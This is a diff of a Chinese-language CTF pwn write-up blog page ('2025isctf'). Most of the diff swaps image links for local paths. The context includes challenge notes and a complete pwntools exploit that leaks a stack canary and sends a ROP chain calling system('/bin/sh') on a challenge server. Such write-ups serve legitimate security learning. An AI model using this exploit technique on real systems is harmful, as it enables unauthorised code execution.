@@ -21,28 +21,28 @@
   <meta name="author" content="bsahfm">
   <meta name="keywords" content="">
   
-    <meta name="description" content="1.签到 某个数设置为固定数就能getshell 不愧是签到，所以exp没保存，现在也没打算补写  设置成这里比较的数，而不是直接那个负数。 2.ez-format开启了canary和pie  两次写入一个格式化字符串漏洞  还有后门函数，所以第一次泄露canary和程序基地址 后面直接覆盖即可 exp： 12345678910111213141516171819202122232425from">
+    <meta name="description" content="1.签到  某个数设置为固定数就能getshell 不愧是签到，所以exp没保存，现在也没打算补写   设置成这里比较的数，而不是直接那个负数。 2.ez-format开启了canary和pie   两次写入一个格式化字符串漏洞   还有后门函数，所以第一次泄露canary和程序基地址 后面直接覆盖即可 exp： 12345678910111213141516171819202122232425f">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2025isctf">
 <meta property="og:url" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/index.html">
 <meta property="og:site_name" content="bsahfm">
-<meta property="og:description" content="1.签到 某个数设置为固定数就能getshell 不愧是签到，所以exp没保存，现在也没打算补写  设置成这里比较的数，而不是直接那个负数。 2.ez-format开启了canary和pie  两次写入一个格式化字符串漏洞  还有后门函数，所以第一次泄露canary和程序基地址 后面直接覆盖即可 exp： 12345678910111213141516171819202122232425from">
+<meta property="og:description" content="1.签到  某个数设置为固定数就能getshell 不愧是签到，所以exp没保存，现在也没打算补写   设置成这里比较的数，而不是直接那个负数。 2.ez-format开启了canary和pie   两次写入一个格式化字符串漏洞   还有后门函数，所以第一次泄露canary和程序基地址 后面直接覆盖即可 exp： 12345678910111213141516171819202122232425f">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765204190634-ee34422f-975f-45b4-bf32-8d9a41819221.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765204249546-fc41402b-9c69-4da7-b8ae-223ab5b972c6.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765204342642-1f6cf73e-4525-4c3e-925e-caa30f51f7a0.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765204401202-c0960e43-0f91-4bce-ba2c-7b6093a96e15.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765204632173-5b076a05-3dd6-4f6e-9509-7eb410bb84ec.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765204757538-7736945e-5907-4e43-836c-f8113492b129.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765204803337-13df0c42-e244-4388-8621-626c0f66042c.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765204930268-b6bda827-43aa-4976-9aac-64722714427a.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1766398942367-b116785a-c4d9-447b-a316-a384ca39c198.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1766399161051-560015cd-07ba-497d-b9f5-20232b742942.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1765204190634-ee34422f-975f-45b4-bf32-8d9a41819221.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1765204249546-fc41402b-9c69-4da7-b8ae-223ab5b972c6.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1765204342642-1f6cf73e-4525-4c3e-925e-caa30f51f7a0.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1765204401202-c0960e43-0f91-4bce-ba2c-7b6093a96e15.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1765204632173-5b076a05-3dd6-4f6e-9509-7eb410bb84ec.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1765204757538-7736945e-5907-4e43-836c-f8113492b129.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1765204803337-13df0c42-e244-4388-8621-626c0f66042c.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1765204930268-b6bda827-43aa-4976-9aac-64722714427a.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1766398942367-b116785a-c4d9-447b-a316-a384ca39c198.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1766399161051-560015cd-07ba-497d-b9f5-20232b742942.png">
 <meta property="article:published_time" content="2026-07-21T14:38:45.000Z">
-<meta property="article:modified_time" content="2026-07-21T15:12:16.986Z">
+<meta property="article:modified_time" content="2026-07-21T15:42:58.010Z">
 <meta property="article:author" content="bsahfm">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765204190634-ee34422f-975f-45b4-bf32-8d9a41819221.png">
+<meta name="twitter:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1765204190634-ee34422f-975f-45b4-bf32-8d9a41819221.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -314,15 +314,19 @@
             
               <div class="markdown-body">
                 
-                <h1 id="1-签到"><a href="#1-签到" class="headerlink" title="1.签到"></a>1.签到</h1><p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765204190634-ee34422f-975f-45b4-bf32-8d9a41819221.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+                <h1 id="1-签到"><a href="#1-签到" class="headerlink" title="1.签到"></a>1.签到</h1><img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1765204190634-ee34422f-975f-45b4-bf32-8d9a41819221.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>某个数设置为固定数就能getshell</p>
 <p>不愧是签到，所以exp没保存，现在也没打算补写</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765204249546-fc41402b-9c69-4da7-b8ae-223ab5b972c6.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1765204249546-fc41402b-9c69-4da7-b8ae-223ab5b972c6.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>设置成这里比较的数，而不是直接那个负数。</p>
 <h1 id="2-ez-format"><a href="#2-ez-format" class="headerlink" title="2.ez-format"></a>2.ez-format</h1><p>开启了canary和pie</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765204342642-1f6cf73e-4525-4c3e-925e-caa30f51f7a0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1765204342642-1f6cf73e-4525-4c3e-925e-caa30f51f7a0.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>两次写入一个格式化字符串漏洞</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765204401202-c0960e43-0f91-4bce-ba2c-7b6093a96e15.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1765204401202-c0960e43-0f91-4bce-ba2c-7b6093a96e15.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>还有后门函数，所以第一次泄露canary和程序基地址</p>
 <p>后面直接覆盖即可</p>
 <p>exp：</p>
@@ -330,18 +334,22 @@
 
 <h1 id="3-2048"><a href="#3-2048" class="headerlink" title="3.2048"></a>3.2048</h1><p>简单运行程序，发现是一个小游戏，要拿够分才能getshell</p>
 <p>简单玩了一下发现纯拿分是不很难的。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765204632173-5b076a05-3dd6-4f6e-9509-7eb410bb84ec.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1765204632173-5b076a05-3dd6-4f6e-9509-7eb410bb84ec.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>查看比较的地方，无符号整型</p>
 <p>对分数为负数无检查，直接负数进行整型溢出，成功进入shell函数</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765204757538-7736945e-5907-4e43-836c-f8113492b129.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1765204757538-7736945e-5907-4e43-836c-f8113492b129.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>shell对我们的命令有过滤，没办法绕过</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765204803337-13df0c42-e244-4388-8621-626c0f66042c.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1765204803337-13df0c42-e244-4388-8621-626c0f66042c.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>有溢出</p>
 <p>puts（）打印遇到\x00才停止，所以这里可以用来泄露canary然后溢出即可</p>
 <p>exp：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)</span><br>p = remote(&#x27;challenge.bluesharkinfo.com&#x27;,23911)<br><br>rdi = 0x40133e<br>ret = 0x40101a<br>bin_sh = 0x404A46<br>system = 0x401514<br><br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(b&#x27;/bin/sh&#x27;)<br><br>p.recvuntil(&#x27;game&#x27;)<br><br>for i in range(7):<br>	p.sendline(b&#x27;1&#x27;)<br>	p.sendline(b&#x27;q&#x27;)<br>	p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(b&#x27;q&#x27;)<br>p.recvuntil(&#x27;$ &#x27;)<br>offset = 0x88<br>p.send(b&#x27;a&#x27;*0x89)<br>p.recvuntil(&#x27;executing command:&#x27;)<br>a = p.recv(145)<br>print(a)<br>canary = a[138:145]<br>print(canary)<br>canary = canary.rjust(8,b&#x27;\x00&#x27;)<br>print(canary)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">gdb.attach(p)</span><br>p.recvuntil(&#x27;$ &#x27;)<br>payload =b&#x27;a&#x27;*offset + canary + p64(0)+p64(rdi)+p64(bin_sh)+p64(system)<br>p.send(payload)<br><br>p.recvuntil(&#x27;$ &#x27;)<br>payload =b&#x27;exit&#x27;<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
 
-<h1 id="4-ret2rop"><a href="#4-ret2rop" class="headerlink" title="4.ret2rop"></a>4.ret2rop</h1><p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765204930268-b6bda827-43aa-4976-9aac-64722714427a.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h1 id="4-ret2rop"><a href="#4-ret2rop" class="headerlink" title="4.ret2rop"></a>4.ret2rop</h1><img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1765204930268-b6bda827-43aa-4976-9aac-64722714427a.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>简答运行程序，在教我们覆盖rop</p>
 <p>vuln有个溢出</p>
 <p>然后程序会进行异或操作</p>
@@ -377,11 +385,13 @@
 
 <h1 id="8-bad-box"><a href="#8-bad-box" class="headerlink" title="8.bad_box"></a>8.bad_box</h1><p>格式化字符串盲注的题目</p>
 <p>有坑</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1766398942367-b116785a-c4d9-447b-a316-a384ca39c198.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1766398942367-b116785a-c4d9-447b-a316-a384ca39c198.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>写入的字符到达一定长度才会回显正常的格式化字符串</p>
 <p>所以对不确定的盲注题真得多尝试才能dump下来</p>
 <p>因为真实环境非常不确定。</p>
-<h3 id="判断pie和系统"><a href="#判断pie和系统" class="headerlink" title="判断pie和系统"></a>判断pie和系统</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1766399161051-560015cd-07ba-497d-b9f5-20232b742942.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="判断pie和系统"><a href="#判断pie和系统" class="headerlink" title="判断pie和系统"></a>判断pie和系统</h3><img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/1766399161051-560015cd-07ba-497d-b9f5-20232b742942.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>0x401275–&gt;64位</p>
 <p>多次尝试依旧有0x401275–&gt;无pie</p>
 <h3 id="dump文件"><a href="#dump文件" class="headerlink" title="dump文件"></a>dump文件</h3><p>调教ai时刻（特定情况dump的代码也不一样）</p>
